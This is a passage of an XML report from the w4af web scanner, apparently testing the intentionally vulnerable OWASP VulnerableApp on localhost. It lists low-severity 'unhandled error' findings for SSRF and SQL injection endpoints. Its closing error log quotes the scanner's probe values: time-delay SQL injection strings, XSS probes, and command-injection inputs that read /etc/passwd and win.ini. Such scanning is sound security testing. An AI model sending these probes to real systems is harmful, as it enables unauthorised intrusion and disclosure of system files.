</http-transaction>
            <http-transaction id="12465">

    <http-request>
        <status>GET http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_3?fileurl=BrNqY9Rv HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:16:54 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiUHJvdmlkZWQgVVJMIG5vdCB2YWxpZCIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
            <http-transaction id="12468">

    <http-request>
        <status>GET http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_3?fileurl= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:16:54 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiUHJvdmlkZWQgVVJMIG5vdCB2YWxpZCIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[12414, 12687, 12688]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_4" var="fileurl">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_4&quot;, using HTTP method GET. The sent data was: &quot;fileurl=&quot; The modified parameter was &quot;fileurl&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="12414">

    <http-request>
        <status>GET http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_4?fileurl=https%3A%2F%2Fgist.githubusercontent.com%2Fraw%2Fbbf2e2183b8f6252061663ce0ddee79b%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:16:52 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiWyAgeyAgICBcIm5hbWVcIjogXCJPV0FTUCBWdWxuZXJhYmxlQXBwXCIsICAgIFwidXJsXCI6IFwiaHR0cHM6Ly9naXRodWIuY29tL1Nhc2FuTGFicy9WdWxuZXJhYmxlQXBwXCIgIH0sICB7ICAgIFwibmFtZVwiOiBcIk9XQVNQIFZ1bG5lcmFibGVBcHAtZmFjYWRlXCIsICAgIFwidXJsXCI6IFwiaHR0cHM6Ly9naXRodWIuY29tL1Nhc2FuTGFicy9WdWxuZXJhYmxlQXBwLWZhY2FkZVwiICB9LCAgeyAgICBcIm5hbWVcIjogXCJPV0FTUCBaQVAgSldUIEFkZG9uXCIsICAgIFwidXJsXCI6IFwiaHR0cHM6Ly9naXRodWIuY29tL1Nhc2FuTGFicy9vd2FzcC16YXAtand0LWFkZG9uXCIgIH0sICB7ICAgIFwibmFtZVwiOiBcIk9XQVNQIFpBUCBGaWxldXBsb2FkIEFkZG9uXCIsICAgIFwidXJsXCI6IFwiaHR0cHM6Ly9naXRodWIuY29tL1Nhc2FuTGFicy9vd2FzcC16YXAtZmlsZXVwbG9hZC1hZGRvblwiICB9XSIsImlzVmFsaWQiOnRydWV9</body>
    </http-response>

</http-transaction>
            <http-transaction id="12687">

    <http-request>
        <status>GET http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_4?fileurl=CzdQ8L1O HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:00 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiUHJvdmlkZWQgVVJMIG5vdCB2YWxpZCIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
            <http-transaction id="12688">

    <http-request>
        <status>GET http://localhost/VulnerableApp/SSRFVulnerability/LEVEL_4?fileurl= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:00 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJjb250ZW50IjoiUHJvdmlkZWQgVVJMIG5vdCB2YWxpZCIsImlzVmFsaWQiOmZhbHNlfQ==</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[13295, 13535, 13551]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_3" var="id">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_3&quot;, using HTTP method GET. The sent data was: &quot;id=&quot; The modified parameter was &quot;id&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="13295">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_3?id=1%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:17 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJpZCI6MSwibmFtZSI6IkF1ZGkiLCJpbWFnZVBhdGgiOiIvVnVsbmVyYWJsZUFwcC9pbWFnZXMvY2Fycy9BdWRpLmpwZyJ9</body>
    </http-response>

</http-transaction>
            <http-transaction id="13535">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_3?id=cjX2LJTs HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:23 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
            <http-transaction id="13551">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_3?id= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:23 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[13525, 13800, 13802]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_4" var="id">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_4&quot;, using HTTP method GET. The sent data was: &quot;id=&quot; The modified parameter was &quot;id&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="13525">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_4?id=1%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:23 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJpZCI6MSwibmFtZSI6IkF1ZGkiLCJpbWFnZVBhdGgiOiIvVnVsbmVyYWJsZUFwcC9pbWFnZXMvY2Fycy9BdWRpLmpwZyJ9</body>
    </http-response>

</http-transaction>
            <http-transaction id="13800">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_4?id=cpTt9pdt HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:30 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
            <http-transaction id="13802">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_4?id= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:30 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>
        <vulnerability id="[13749, 14003, 14010]" method="GET" name="Unhandled error in web application" plugin="generic" severity="Low" url="http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_5" var="id">
    <description>An unhandled error, which could potentially translate to a vulnerability, was found at: &quot;http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_5&quot;, using HTTP method GET. The sent data was: &quot;id=&quot; The modified parameter was &quot;id&quot;.</description>

    <long-description>Information Leakage is an application weakness where an application
reveals sensitive data, such as technical details of the web application,
environment, or user-specific data. Sensitive data may be used by an
attacker to exploit the target web application, its hosting network,
or its users.



In its most common form, information leakage is the result of one or more
of the following conditions:

* A failure to scrub out HTML/Script comments containing sensitive
information

* Improper application or server configurations

* Improper application error handling
</long-description>
    <fix-guidance> * Ensure that the application source handles exceptions and errors in
a such a way that no sensitive information is disclosed to the users

* Configure the application server to handle and log any exceptions
that the application might yield
</fix-guidance>
    <fix-effort>60</fix-effort>
    <references>
            <reference title="WASC threat classification" url="http://projects.webappsec.org/w/page/13246936/Information%20Leakage" />
    </references>

    <http-transactions>
            <http-transaction id="13749">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_5?id=1%0A HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 200</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:29 GMT" />
            <header field="Content-Type" content="application/json" />
            <header field="Transfer-Encoding" content="chunked" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">eyJpZCI6MSwibmFtZSI6IkF1ZGkiLCJpbWFnZVBhdGgiOiIvVnVsbmVyYWJsZUFwcC9pbWFnZXMvY2Fycy9BdWRpLmpwZyJ9</body>
    </http-response>

</http-transaction>
            <http-transaction id="14003">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_5?id=IEfhkZ0m HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:35 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
            <http-transaction id="14010">

    <http-request>
        <status>GET http://localhost/VulnerableApp/UnionBasedSQLInjectionVulnerability/LEVEL_5?id= HTTP/1.1</status>
        <headers>
            <header field="User-agent" content="python-requests/2.31.0" />
            <header field="Host" content="localhost" />
            <header field="Accept-encoding" content="gzip, deflate" />
            <header field="Accept" content="*/*" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64"></body>
    </http-request>

    <http-response>
        <status>HTTP/1.1 500</status>
        <headers>
            <header field="Server" content="openresty/1.21.4.3" />
            <header field="Date" content="Wed, 20 Mar 2024 17:17:35 GMT" />
            <header field="Content-Type" content="text/plain;charset=UTF-8" />
            <header field="Content-Length" content="41" />
            <header field="Connection" content="keep-alive" />
        </headers>
        <body content-encoding="base64">U3lzdGVtIEVycm9yIE9jY3VycmVkLiBwbGVhc2UgY2hlY2sgbG9ncy4=</body>
    </http-response>

</http-transaction>
    </http-transactions>
</vulnerability>

    <error caller="threading">b&#39;audit.rfi plugin needs to be correctly configured to use. Please set valid values for local address (eg. 10.5.2.5) and port (eg. 44449), or use the official w4af site as the target server for remote inclusions. The configuration error is: &#34;Listen address and port need to be configured&#34;&#39;</error>
    <error caller="threading">b&#39;The spider_man plugin got an error while requesting &#34;http://vulnerableapp-base:9090/&#34;. Exception: &#34;[Errno -5] No address associated with hostname&#34;. Generated 204 &#34;No Content&#34; response (id:124)&#39;</error>
    <error caller="threading">b&#39;The spider_man plugin got an error while requesting &#34;http://vulnerableapp-base:9090/&#34;. Exception: &#34;[Errno -5] No address associated with hostname&#34;. Generated 204 &#34;No Content&#34; response (id:126)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/CommandInjection/LEVEL_1?ipaddress=1%3Bwaitfor%20delay%20%270%3A0%3A5%27--&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:3461)&#39;</error>
    <error caller="threading">b&#39;The blind_sqli plugin got an error while requesting &#34;http://localhost/VulnerableApp/CommandInjection/LEVEL_2?ipaddress=1%3Bwaitfor%20delay%20%270%3A0%3A5%27--&#34;. Exception: &#34;HTTP timeout error&#34;. Generated 204 &#34;No Content&#34; response (id:3757)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_7?returnTo=nkik2%3Cnkik2&#34;. Exception: &#34;[Errno -5] No address associated with hostname&#34;. Generated 204 &#34;No Content&#34; response (id:5165)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_7?returnTo=jb7yk--%3Ejb7yk&#34;. Exception: &#34;[Errno -5] No address associated with hostname&#34;. Generated 204 &#34;No Content&#34; response (id:5166)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_7?returnTo=ig3zw%2A%2Fig3zw&#34;. Exception: &#34;[Errno -5] No address associated with hostname&#34;. Generated 204 &#34;No Content&#34; response (id:5167)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_7?returnTo=tiyrx%0Atiyrx&#34;. Exception: &#34;[Errno -5] No address associated with hostname&#34;. Generated 204 &#34;No Content&#34; response (id:5174)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_7?returnTo=u0z8c%3Au0z8c&#34;. Exception: &#34;[Errno -5] No address associated with hostname&#34;. Generated 204 &#34;No Content&#34; response (id:5175)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_7?returnTo=8vhh9%2A%2F%3A%28%22%278vhh9&#34;. Exception: &#34;[Errno -5] No address associated with hostname&#34;. Generated 204 &#34;No Content&#34; response (id:5176)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_7?returnTo=eqlmr%22eqlmr&#34;. Exception: &#34;[Errno -5] No address associated with hostname&#34;. Generated 204 &#34;No Content&#34; response (id:5177)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_7?returnTo=a5cnz%60a5cnz&#34;. Exception: &#34;[Errno -5] No address associated with hostname&#34;. Generated 204 &#34;No Content&#34; response (id:5178)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_7?returnTo=0cyz6%20%3D0cyz6&#34;. Exception: &#34;[Errno -5] No address associated with hostname&#34;. Generated 204 &#34;No Content&#34; response (id:5179)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/Http3xxStatusCodeBasedInjection/LEVEL_7?returnTo=doalc%27doalc&#34;. Exception: &#34;[Errno -5] No address associated with hostname&#34;. Generated 204 &#34;No Content&#34; response (id:5228)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=bmxkf%2A%2F%3A%28%22%27bmxkf&#34;. Exception: &#34;[Errno 24] Too many open files&#34;. Generated 204 &#34;No Content&#34; response (id:9535)&#39;</error>
    <error caller="threading">b&#39;The xss plugin got an error while requesting &#34;http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=fq8j7--%3Efq8j7&#34;. Exception: &#34;[Errno 24] Too many open files&#34;. Generated 204 &#34;No Content&#34; response (id:9536)&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9540.trace&#34;&#34;. The request/response that generated the error is: 9540 http://localhost/VulnerableApp/PathTraversal/LEVEL_7?fileName=%27%2B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%288%29%29%29foo%29%2B%27 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9533.trace&#34;&#34;. The request/response that generated the error is: 9533 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=xwy8h%0Axwy8h 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9542.trace&#34;&#34;. The request/response that generated the error is: 9542 http://localhost/VulnerableApp/PathTraversal/LEVEL_7?fileName=1%27%29%3Bwaitfor%20delay%20%270%3A0%3A8%27-- 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9534.trace&#34;&#34;. The request/response that generated the error is: 9534 http://localhost/VulnerableApp/PathTraversal/LEVEL_7?fileName=1%29%3Bwaitfor%20delay%20%270%3A0%3A8%27-- 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9537.trace&#34;&#34;. The request/response that generated the error is: 9537 http://localhost/VulnerableApp/PathTraversal/LEVEL_7?fileName=1%27%3Bwaitfor%20delay%20%270%3A0%3A8%27-- 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9538.trace&#34;&#34;. The request/response that generated the error is: 9538 http://localhost/VulnerableApp/PathTraversal/LEVEL_7?fileName=1%29%29%3Bwaitfor%20delay%20%270%3A0%3A8%27-- 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9539.trace&#34;&#34;. The request/response that generated the error is: 9539 http://localhost/VulnerableApp/PathTraversal/LEVEL_7?fileName=%22%2B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%288%29%29%29foo%29%2B%22 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9541.trace&#34;&#34;. The request/response that generated the error is: 9541 http://localhost/VulnerableApp/PathTraversal/LEVEL_8 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9543.trace&#34;&#34;. The request/response that generated the error is: 9543 http://localhost/VulnerableApp/PathTraversal/LEVEL_7?fileName=1111111111111111111111111111119%21 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9549.trace&#34;&#34;. The request/response that generated the error is: 9549 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=hTtp%3A%2F%2Fw4af.net%2F 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9546.trace&#34;&#34;. The request/response that generated the error is: 9546 http://localhost/VulnerableApp/PathTraversal/LEVEL_7?fileName=1%27%20or%20pg_sleep%288%29%20and%20%271%27%3D%271 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9633.trace&#34;&#34;. The request/response that generated the error is: 9633 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=b%27UserInfo.json%5Cn%27%2Fbin%2Fcat%20%2Fetc%2Fpasswd 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9639.trace&#34;&#34;. The request/response that generated the error is: 9639 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=github.com%2Fw4af%2Fw4af 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9640.trace&#34;&#34;. The request/response that generated the error is: 9640 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=%3Btype%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
    <error caller="threading">b&#39;Exception while inserting request/response to the database: &#34;Directory does not exist: &#34;&#34; while trying to write DB history to &#34;/home/kali/.w4af/tmp/1331006/main.db_traces/9641.trace&#34;&#34;. The request/response that generated the error is: 9641 http://localhost/VulnerableApp/PathTraversal/LEVEL_8?fileName=type%20%25SYSTEMROOT%25%5Cwin.ini 200&#39;</error>
